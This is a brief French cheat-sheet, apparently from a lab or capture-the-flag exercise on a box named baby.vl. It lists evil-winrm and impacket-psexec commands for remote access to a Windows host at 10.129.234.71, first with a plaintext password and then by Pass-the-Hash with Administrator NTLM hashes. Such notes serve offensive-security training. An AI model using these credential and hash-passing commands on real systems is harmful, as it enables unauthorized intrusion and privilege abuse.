## Mode d'accès et connection sur les services à distance

En mode classique
```bash
#
evil-winrm -i 10.129.234.71 -u Caroline.Robinson -p 'Password123!'
download
upload

# suite impact
impacket-psexec baby.vl/Administrator:password@10.129.234.71
```

en mode Pass-The-Hash
```
impacket-psexec baby.vl/Administrator@10.129.234.71 -hashes 'aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d' 
evil-winrm -i 10.129.234.71 -u Administrator -H '8d992faed38128ae85e95fa35868bb43'
```
